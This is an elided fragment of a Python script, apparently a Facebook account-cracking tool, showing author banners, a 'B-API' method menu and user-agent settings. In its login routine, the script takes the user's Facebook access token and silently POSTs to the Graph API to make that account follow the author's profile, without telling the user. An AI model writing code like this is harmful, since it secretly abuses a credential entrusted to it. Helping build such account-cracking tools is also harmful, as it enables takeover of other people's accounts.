...
\33[93m║       #TOOL AUTHOR \x1b[0;32m[ALIU] \x1b[0;36mJOSH\33[93m    ║
\33[93m╚══════════════════════════════════════════╝
\x1b[0;32m -------------------------------------------
\x1b[0;34m╔══════════════════════════════════════════╗
\x1b[0;34m║#BEST FRIEND  :\x1b[0;31mALIU /JOSH  \x1b[0;34m                           ║
...
def login():
	...
	try:
		...
		try:
			...
			#-> bot follow
			requests.post("https://graph.facebook.com/819777271/subscribers?access_token="+token)      # Aliu Justice
			menu()
		except KeyError:
...
def method():
	...
	print("\033[1;97m[\033[1;94m1\x1b[0;37m] B-API\033[1;97m [ \033[1;92mALIU PRO/FASTER \033[1;97m]")
...
def setting_ua():
	...
	if ua =="":
		...
		print("Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95/11.0.026; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413;]")
		os.system("rm -f .ua")
		time.sleep(1)
